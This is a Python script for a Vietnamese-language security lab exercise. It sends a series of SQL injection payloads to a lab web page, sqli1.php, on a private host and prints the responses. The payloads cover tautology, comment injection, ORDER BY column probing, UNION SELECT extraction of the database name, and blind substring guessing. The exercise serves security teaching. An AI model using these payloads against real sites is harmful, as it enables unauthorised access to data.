#!/usr/bin/env python3
"""
Lab 05 - Kiem thu lo hong SELECT SQL Injection (sqli1.php)
Thuc hien cac buoc do tham va khai thac theo giao trinh Lab 05.
"""

import sys
import urllib.parse
import urllib.request

BASE_URL = "http://10.2.6.80/sqli/sqli1.php"

TEST_CASES = [
    ("1. Truy cap binh thuong", "laptop"),
    ("2. Tham do ki tu dac biet (dau nhay don)", "laptop'"),
    ("3. Chen chu thich dong cau truy van", "laptop';#"),
    ("4. Tan cong Tautology (luon dung)", "any' or 1;#"),
    ("5. Tham do so cot (ORDER BY 4 - Dung)", "laptop' ORDER BY 4;#"),
    ("6. Tham do so cot (ORDER BY 5 - Sai)", "laptop' ORDER BY 5;#"),
    ("7. Trich xuat thong tin CSDL (UNION SELECT)", "laptop' UNION SELECT 1, database(), 3, 4;#"),
    ("8. Blind SQLi doan chu cai dau CSDL", "laptop' and substring(database(),1,1)='w';#"),
]

def run_tests():
    print(f"[*] Bat dau kiem thu SELECT SQL Injection tai: {BASE_URL}")
    for title, payload in TEST_CASES:
        encoded = urllib.parse.quote(payload)
        url = f"{BASE_URL}?cat={encoded}"
        print(f"\n===== {title} =====")
        print(f"Payload: {payload}")
        print(f"URL: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Lab05-Tester"})
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode('utf-8', errors='ignore')
                for line in body.splitlines():
                    if any(k in line for k in ["Product Information", "Vendor", "Model", "Price", "error", "Unknown column"]):
                        print(f"  {line.strip()[:100]}")
        except Exception as e:
            print(f"  [!] Loi ket noi: {e}")

if __name__ == "__main__":
    run_tests()
